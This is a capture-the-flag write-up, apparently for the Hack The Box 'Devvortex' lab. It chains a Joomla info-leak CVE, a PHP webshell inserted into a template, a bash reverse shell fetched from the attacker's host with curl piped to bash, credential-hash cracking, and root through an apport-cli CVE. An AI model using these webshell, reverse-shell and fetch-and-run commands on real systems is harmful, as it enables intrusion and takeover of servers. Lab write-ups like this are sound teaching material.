### Initial Port Scan and Web Enumeration

I begin my attack on Devvortex with an Nmap scan to identify open ports and running services. This is the first step in any penetration test, as it helps uncover entry points into the system.

```
nmap 10.10.11.242 -p- -v -T4 -sV
```

Nmap reveals two open ports:

- **80 (HTTP)**: The web server is active, suggesting the presence of a web application.
- **22 (SSH)**: The Secure Shell service is active, which I may exploit later after gathering credentials.

I begin exploring the web service by navigating to http://10.10.11.242. While investigating, I spot an email address at the bottom of the page that reveals the domain name devvortex.htb, which I add to /etc/hosts to map it to the IP address.

Next, I use **FFUF** (Fuzz Faster U Fool), a powerful fuzzer, to brute-force subdomains that might be hidden within the site's infrastructure.

```
ffuf -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -w /usr/share/wordlists/subdomains/n0kovo_subdomains/n0kovo_subdomains_small.txt -fc 302
```

The subdomain I found from the previous command, `dev.devvortex.htb`, doesn't have much to offer visually, so I dive deeper.

```
ffuf -u http://dev.devvortex.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e ".html,.php,.txt,.do"
```

I find a `README.txt`, which mentions Joomla! CMS. This discovery prompts me to investigate any potential vulnerabilities in Joomla.

### Exploiting Joomla (CVE-2023-23752)

Joomla! CMS has a known vulnerability, [CVE-2023-23752](https://vulncheck.com/blog/joomla-for-rce), affecting versions 4.0.0 - 4.2.7. This flaw allows attackers to bypass authentication and leak sensitive information, such as database credentials. After a quick search, I find a [ready-to-use exploit on GitHub](https://github.com/Acceis/exploit-CVE-2023-23752).

I clone the repository and make the exploit script executable:

```
gh repo clone Acceis/exploit-CVE-2023-23752
```

```
chmod +x ./exploit-CVE-2023-23752
```

Attempting to run the script throws an error due to missing dependencies. As the documentation states, I install the required Ruby gems:

```
gem install httpx docopt paint
```

Once the dependencies are installed, I successfully run the exploit:

```
./exploit.rb http://dev.devvortex.htb
```

The script returns the following sensitive database information:

```
Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4nth.................
DB name: joomla
DB prefix: sd4fg_
```

### Remote Code Execution and Reverse Shell

Now that I have a username and password, I check back in on ffuf to see an `/administrator` directory, which which turns out to be a Joomla admin panel. Using the credentials from the Joomla database, I log in as `lewis`. The [VulnCheck article describing CVE-2023-23752](https://vulncheck.com/blog/joomla-for-rce) outlines a method for gaining remote code execution (RCE) by editing templates in the Joomla CMS. I navigate to `System > Administrator Templates > Atum > error.php` and insert the following PHP code:

```
php system($_GET["cmd"]);
```

This code allows me to execute arbitrary commands on the server. Now I will try to establish a reverse shell to maintain persistence and explore the system further.

I prepare a bash reverse shell script:

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.8/4444 0>&1
```

I host the reverse shell script using a Python HTTP server and set up a netcat listener on port 1337 to catch the shell:

```
nc -nvlp 1337
```

```
python3 -m http.server 8000
```

Next, I use `curl` to download and execute the reverse shell:

```
http://dev.devvortex.htb/administrator/templates/atum/error.php?cmd=curl%2010.10.14.44:8000/shell.sh|bash
```

### Privilege Escalation: Database and User Hashes

With the reverse shell established, I now have remote access to the server as the `www-data` user. From my reverse shell, I explore potential privilege escalation paths. First, I retrieve **pspy** and linpeas to automate some of the data gathering:

```
wget http://10.10.14.44:8000/pspy64
```

```
wget http://10.10.14.44:8000/linpeas.sh
```

Linpeas detects a MySQL service running, and another user named `logan` executing processes as **root**. With the Joomla database credentials, I log into the MySQL instance:

```
mysql -u lewis -p
```

I dump the Joomla user table and find `logan`’s hashed password:

```
SHOW databases;
USE joomla;
SHOW tables;
SELECT * FROM sd4fg_users;
```

I extract the hash and crack it using hashcat on my host system:

```
./hashcat "Z:\HTB\VirtualBox VMs\Kali\Share\hashes.txt" -m 3200 --opencl-device-types=1,2 Z:\HTB\Wordlists\rockyou.txt -r rules/best64.rule 
```

I crack the hash in no time. I then try it on the SSH port I found with Nmap earlier. 

```
ssh logan@10.10.11.242
```

### Root Access: Apport-cli (CVE-2023-1326)

In `linpeas` I saw that this user was running processes as root, so I quickly check what I have sudo privileges for. 

```
sudo -l
```

`Logan` has full sudo privileges over apport-cli, a crash report utility known to be vulnerable to [CVE-2023-1326](https://nvd.nist.gov/vuln/detail/CVE-2023-1326), which allows privilege escalation via `less`. To pull off this exploit, I utilized a [PoC I found on GitHub](https://github.com/diego-tella/CVE-2023-1326-PoC). 

```
sudo apport-cli -f ./test.crash
```

I follow the menu options:

1. Choose the second option (`2`).
2. Select the first option (`1`).
3. Enter `V` to view the report.

Now, I can exploit the use of `less` to gain a root shell:

```
!/bin/bash
```

Finally, I  navigate to `/root` and retrieve the root flag.